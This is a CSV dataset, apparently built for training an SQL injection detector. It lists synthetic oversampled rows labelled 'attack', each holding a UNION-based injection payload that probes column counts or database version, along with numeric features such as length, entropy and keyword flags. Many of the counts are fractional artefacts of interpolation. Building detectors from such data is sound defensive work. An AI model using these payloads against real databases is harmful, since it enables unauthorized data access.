id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000396,attack,union,"-5496 union all select 2099,2099,2099#",nearest_attack_euclidean,R000620,0.37916430318768324,40.11241259423037,19.577517481153926,3.962911556304286,14.0,17.689930075384297,4.0,4.422482518846075,0.3503220463162636,0.4396687523604146,0.10009201323321819,0.10991718809010363,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4224825188460746,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000397,attack,union,"1'||  (  select 'tdcr' where 6792  =  6792 union all select null,null,null,null,null#",nearest_attack_euclidean,R000700,0.18848493042470463,86.35899735355798,26.0,4.051014880657462,50.08719788284638,9.0,15.0,12.271799470711596,0.5798458757800786,0.10428353252522593,0.17380588754204318,0.14206470415265227,3.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.271799470711595,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000398,attack,union,"-1947 union all select 7780,7780,7780,7780,7780,7780,7780,7780#",nearest_attack_euclidean,R000604,0.24688272563825203,61.54671902080658,19.41868760832263,3.517808310261231,14.0,34.837375216645256,4.0,8.709343804161314,0.22779034857928515,0.565701355747021,0.06508295673693862,0.14142533893675524,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.709343804161315,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000399,attack,union,"-1687   )    )    as lnva where 8396  =  8396 union all select 8396,8396#",nearest_attack_euclidean,R000684,0.49311253046959846,76.28564575114767,26.32856457511477,3.924114965266977,25.0,22.628516600918136,22.0,6.657129150229535,0.32890887212762965,0.2947959724119608,0.2894398074723141,0.0868553479880954,0.0,0.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,1.657129150229534,2.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000400,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000047,0.0,97.0,27.0,3.7712694510833757,49.0,3.0,33.0,12.0,0.5051546391752577,0.030927835051546393,0.3402061855670103,0.12371134020618557,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,0.9999999999999996,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000401,attack,union,"-3822""   )    )    as dftp where 2817  =  2817 union all select 2817,2817,2817,2817,2817,2817#",nearest_attack_euclidean,R000638,0.250557218285956,93.70821906458657,27.0,3.9676751776194057,25.0,35.76657525166926,22.0,10.941643812917315,0.26753995271652886,0.3804973541404828,0.23543515839054538,0.116527534752443,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,4.941643812917315,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000402,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000359,0.3328498147991324,100.58061397898499,27.258061397898498,4.014246285683037,25.0,46.06449118318799,16.0,13.516122795796997,0.24900648625523197,0.4573670749128008,0.15936415120334846,0.13426228762861878,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.516122795796997,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000403,attack,union," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000064,0.8542449635532093,80.6479434368875,28.823971718443754,4.024367843343865,40.0,2.8239717184437545,23.82397171844375,14.0,0.4960278578722456,0.03497388324476974,0.29538850862769866,0.17360975025528597,3.0,0.35205656311249295,2.0,0.0,1.0,1.0,0.0,2.0,0.0,1.0,0.9999999999999996,4.823971718443754,1.0,0.1760282815562464,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000404,attack,union,"1'||  (  select 'zpwe' from dual where 7743  =  7743 union all select null,null#",nearest_attack_euclidean,R000240,0.32663328284962667,79.33956800966918,28.603740805801504,4.2222319328279205,44.471654407735336,9.0,16.735827203867668,9.132086398066166,0.5604086320306191,0.11349064798549624,0.21084892002417294,0.11525179995971178,3.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1320863980661655,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.8679136019338343,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.867913601933834
SMOTE_000405,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000207,0.5225714753212353,82.3015244766775,24.5396951046645,3.9989383318709018,27.0,33.841219581341996,11.0,10.460304895335499,0.32907589633407175,0.4099841228633223,0.13406795776573296,0.12687202303687295,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,6.460304895335499,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000406,attack,union," select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000074,0.12274696673943282,72.0,31.45752651387319,4.34029896349454,42.0,3.0,17.0,10.0,0.5833333333333334,0.041666666666666685,0.2361111111111111,0.1388888888888889,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.9999999999999996,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000407,attack,union,"1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--",nearest_attack_euclidean,R000504,0.960295950408855,85.57653072266872,24.423469277331282,3.793258922950331,45.0,9.0,22.0,9.576530722668718,0.5258626699698916,0.10517253399397833,0.2570884164297248,0.11187637960640527,0.5765307226687175,0.0,2.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,4.0,3.0,0.5765307226687175,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000408,attack,union,"-6680%""   )    )    union all select 3719,3719,3719,3719,3719,3719,3719,3719,3719--",nearest_attack_euclidean,R000706,0.13931351262198005,81.90028348060248,23.0,3.858821276227388,14.0,39.120226784481986,14.0,14.780056696120496,0.17105283152171225,0.4774432319876283,0.17105283152171227,0.18045110496894717,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,7.780056696120497,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000409,attack,union," select * from users where id  =  '1' +   (  \  )   union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000150,0.034543335181425966,82.05856450998724,34.058564509987235,4.2135961732467475,40.0,3.0,25.0,14.058564509987233,0.4874606846312828,0.036559551347346175,0.30466292789455174,0.17131683612681928,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000410,attack,union,"-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--",nearest_attack_euclidean,R000483,0.06147735979125902,74.63198126842691,20.0,3.6888267867600906,14.0,43.70558501474153,4.0,12.926396253685382,0.1876480499508616,0.5855450857704438,0.05361372855738905,0.17319313572130549,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.926396253685382,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000411,attack,union," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000008,0.02717203726767762,75.0,32.10201091918675,4.399498778178869,42.0,3.0,17.0,13.0,0.56,0.03999999999999998,0.22666666666666666,0.17333333333333334,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.9999999999999996,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000412,attack,union,"-7418 union all select 1340,1340,1340,1340,1340#",nearest_attack_euclidean,R000614,0.009800532623533953,47.93824933893934,19.98764986778787,3.9391458677905913,14.0,23.950599471151474,4.0,5.9876498677878685,0.2920855180498301,0.4995691814344605,0.08345300515709428,0.12489229535861514,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.987649867787869,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000413,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000047,0.3656873654442641,98.08317212858802,26.729206967852996,3.7395332588844665,49.0,3.0,34.08317212858802,12.0,0.49973712010811344,0.030596150210700834,0.3472821288383825,0.12238460084280328,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.270793032147004,0.0,0.0,0.9999999999999996,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000414,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,0.06190406724853418,87.92197158508645,24.019507103728387,3.7904223051694763,52.92197158508645,9.0,16.0,10.0,0.6019032745505988,0.10236772940127462,0.18198707449115487,0.11374192155697177,0.0,0.019507103728385544,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.980492896271614,3.0,0.0,0.019507103728385627,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000415,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000116,0.0,76.0,34.0,4.466308891573198,42.0,3.0,17.0,14.0,0.5526315789473685,0.03947368421052633,0.2236842105263158,0.18421052631578946,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.9999999999999996,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000416,attack,union,"-4826 union all select 4532,4532,4532,4532,4532--",nearest_attack_euclidean,R000590,0.019058010582356434,48.86735884985464,19.0,3.9056184843537958,14.0,23.89388707988371,4.0,6.973471769970928,0.28657559188406073,0.48886078595444826,0.08187874053830307,0.14268488162318785,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9734717699709283,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000417,attack,union,"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",nearest_attack_euclidean,R000589,0.2825936723046054,66.10564249727821,18.0,3.4275404467099104,14.0,37.68451399782257,4.0,10.421128499455643,0.21207450295246943,0.5697476825087475,0.060592715129277,0.1575850994095061,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.421128499455643,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000418,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000041,0.31374695610699194,77.24656361157247,31.150687277685506,4.203286459112926,42.0,4.0,21.246563611572466,10.0,0.5440190249936698,0.05181133571368282,0.2746413000084401,0.1295283392842071,0.0,0.0,2.0,0.0,1.0,1.849312722314493,0.0,0.0,0.0,0.0,0.9999999999999996,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000419,attack,union,"-9039'  )   union all select 8058,8058,8058,8058,8058--",nearest_attack_euclidean,R000227,0.13998334972472548,55.0,20.214250129577525,3.8520310916077007,14.0,24.0,8.0,9.0,0.2545454545454545,0.43636363636363634,0.14545454545454545,0.16363636363636364,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,4.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000420,attack,union,"-5160'  )   union all select 8067,8067,8067,8067,8067,8067,8067--",nearest_attack_euclidean,R000751,0.6117374601841802,60.57715464989031,21.0,3.909640953991383,14.0,28.461723719912246,8.0,10.115430929978062,0.23270484892350646,0.4675645015378479,0.13297419938486085,0.1667564501537848,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.115430929978062,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000421,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000408,0.22693266325130534,74.3300091676961,19.0,3.4914501243915765,53.66400733415688,1.0,11.0,8.66600183353922,0.7218891870223569,0.013467381547869473,0.14814119702656467,0.116502234403209,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.6660018335392195,-4.440892098500626e-16,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000422,attack,union,"-1487""  )   as crfi where 2407  =  2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",nearest_attack_euclidean,R000492,0.0658138299220552,108.25996590933295,26.0,3.9288687571111347,25.0,52.0,16.222827922285376,15.037137987047561,0.23095820066559392,0.4803930573844354,0.14975088253280944,0.13889785941716126,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.0371379870475623,0.0,0.0,9.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000423,attack,union,"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",nearest_attack_euclidean,R000381,0.14633704227453348,73.40315510314355,18.88063102062871,3.615523499794806,14.0,43.522524082514835,4.0,11.880631020628709,0.19082566168350773,0.5928178530293345,0.05452161762385935,0.16183486766329847,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.880631020628709,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000424,attack,union,"-8612'+  (  select 'iqla' where 5035  =  5035 union all select 5035,5035,5035,5035,5035,5035,5035#",nearest_attack_euclidean,R000775,0.3767595727936659,99.0318694330455,28.2063738866091,3.9902660246781116,29.0,40.8254955464364,15.0,14.2063738866091,0.29424931447944397,0.41037332151687417,0.152197921282471,0.1431794427212108,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.206373886609102,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000425,attack,union,"-4915' union all select 1928,1928,1928,1928#",nearest_attack_euclidean,R000562,0.2954340175100117,42.221341917063675,21.0,4.104548581910951,14.0,18.57707353365094,4.0,5.644268383412735,0.3326930146626507,0.4387904412234078,0.09505514704647164,0.13346139706746984,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6442683834127343,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000426,attack,union,-5569'  )   as cjaf where 3753  =  3753 union all select 3753#,nearest_attack_euclidean,R000561,0.13321347479703627,62.539758635181585,26.07710837645451,4.01874484301268,25.0,16.0,16.462650258727074,5.077108376454512,0.4000715367275503,0.25604578350563223,0.2627508597190681,0.08113182004774938,1.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0771083764545124,0.0,0.0,0.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000427,attack,union,"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000556,0.7055870081181804,88.64993323241409,25.774988872069013,3.85981502418462,50.54997774413803,9.0,18.32496661620704,10.774988872069013,0.571224132207255,0.10195319951739501,0.20546853472752555,0.12135413354782444,0.0,1.0,2.0,0.0,0.0,1.0,0.0,1.3874944360345067,0.0,0.0,5.3874944360345065,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000428,attack,union," select * from users where id  =  1 + @<@. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000101,0.2046750364648205,80.0,28.0,3.9378581545441276,40.0,3.0,25.0,12.0,0.5,0.03749999999999998,0.3125,0.15,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,5.684402833354554,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000429,attack,union," select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000126,0.0761343656641611,83.0,28.0,3.9571597537138823,43.0,3.886397852184473,25.0,11.113602147815529,0.5180722891566265,0.04682407050824661,0.30120481927710846,0.13389882105801842,2.0,1.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.113602147815529,4.0,1.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
